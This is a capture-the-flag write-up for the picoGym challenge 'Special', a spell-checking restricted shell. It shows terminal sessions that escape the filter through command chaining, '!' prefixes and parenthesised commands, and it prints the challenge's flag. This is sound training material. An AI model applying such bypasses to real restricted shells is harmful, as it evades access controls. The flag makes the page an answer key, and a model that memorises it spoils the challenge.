# picoGym Level 0377: Special
Source: https://play.picoctf.org/practice/challenge/377

## Goal
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)<br>
Start your instance to see connection details.<br>
ssh -p 49230 ctf-player@saturn.picoctf.net<br>
The password is <b>d8819d45</b>

## What I learned
```
shell bypass via command line
```

## Solution
```
https://webshell.picoctf.org/

AsianHacker-picoctf@webshell:~$ ssh -p 49230 ctf-player@saturn.picoctf.net ⌨️
The authenticity of host '[saturn.picoctf.net]:49230 ([13.59.203.175]:49230)' can't be established.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes ⌨️
Warning: Permanently added '[saturn.picoctf.net]:49230' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: ⌨️
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Method 1:
Special$ ls ⌨️
Is 
sh: 1: Is: not found
Special$ clear ⌨️
Clear 
sh: 1: Clear: not found
Special$ clear; ⌨️
Clear 
sh: 1: Clear: not found
Special$ clear & find . ⌨️
Clear & find . 
sh: 1: Clear: not found
.
./blargh
./blargh/flag.txt
./.cache
./.cache/motd.legal-displayed
Special$ clear & cat ./blargh/flag.txt ⌨️
Clear & cat ./blargh/flag.txt 
sh: 1: Clear: not found
picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335} 🔐

Method 2: ! force run commands
Special$ /bin/clear ⌨️                                  # Only one that works others got filtered
Special$ /bin/ls -la ⌨️  
Absolutely not paths like that, please!
Special$ ! /usr/bin/ls -la ⌨️
! /usr/bin/ls la 
/usr/bin/ls: cannot access 'la': No such file or directory
Special$ ! /usr/bin/ls ⌨️
! /usr/bin/ls 
blargh
Special$ ! /bin/ls ⌨️
! /bin/ls 
blargh
Special$ ! /bin/ls blargh/ ⌨️
! /bin/ls blargh/ 
flag.txt
Special$ ! /bin/cat blargh/flag.txt ⌨️
! /bin/cat blargh/flag.txt 
picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335} 🔐

Method 3: arithmetic evaluation, Restricted use other 2 method above
Special$ ((clear)) ⌨️
Special$ ((ls)) ⌨️
((ls)) 
blargh
Special$ ((ls)) blargh ⌨️
((ls)) large 
sh: 1: Syntax error: word unexpected
Special$ ((/???/??)) ⌨️             
((/???/??)) 
/bin/ar: invalid option -- '/'
Special$ ((/bin/ls)) ⌨️
((/bin/ls)) 
blargh
Special$ ((/bin/cd)) blargh ⌨️
((/bin/cd)) large 
sh: 1: Syntax error: word unexpected
Special$ ((./*/)) ⌨️
((./*/)) 
sh: 1: ./blargh/: Permission denied
Special$ ((cat)) blargh/flag.txt ⌨️
sh: 1: Syntax error: word unexpected
Special$ ((bin/cat)) blargh/flag.txt ⌨️
((bin/cat)) blargh/flag.txt 
sh: 1: Syntax error: word unexpected
```

## Flag
picoCTF{5p311ch3ck_15_7h3_w0r57_0c61d335}

## Continue
[Continue](./picoGym0378.md)